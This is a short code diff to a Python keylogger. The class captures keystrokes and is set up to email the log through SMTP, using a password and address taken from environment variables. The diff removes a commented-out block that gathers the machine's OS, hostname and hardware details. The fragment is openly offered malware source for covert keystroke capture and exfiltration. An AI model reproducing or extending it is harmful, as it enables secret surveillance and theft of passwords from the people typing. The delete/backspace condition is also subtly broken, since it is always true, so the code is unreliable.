@@ -4,7 +4,6 @@ import sys
 import os
 import smtplib
 
-
 PASSWORD = os.environ.get("SMTP_PASSWORD")
 MAIL = os.environ.get("MAIL")
 
@@ -14,12 +13,6 @@ class Keylogger:
         self.email_to = email_to
         self.password = password
         self.interval = time_interval
-        
-# optional: get computer information
-        '''
-        x = os.uname()
-        f"keylogger start running \n" + f"operating system name: {x.sysname}\n" + f"name of machine: {x.nodename}\n" + f"hardware identifier: {x.machine}\n"
-        '''
         self.log = ' '
         self.exit = False
     
@@ -37,6 +30,7 @@ class Keylogger:
             elif key == keyboard.Key.f15:
                 self.exit = True
                 return False
+# delete and backspace ON
             elif key == keyboard.Key.delete or keyboard.Key.backspace:
                 self.log = self.log[:len(self.log)-1]
                 x = ''
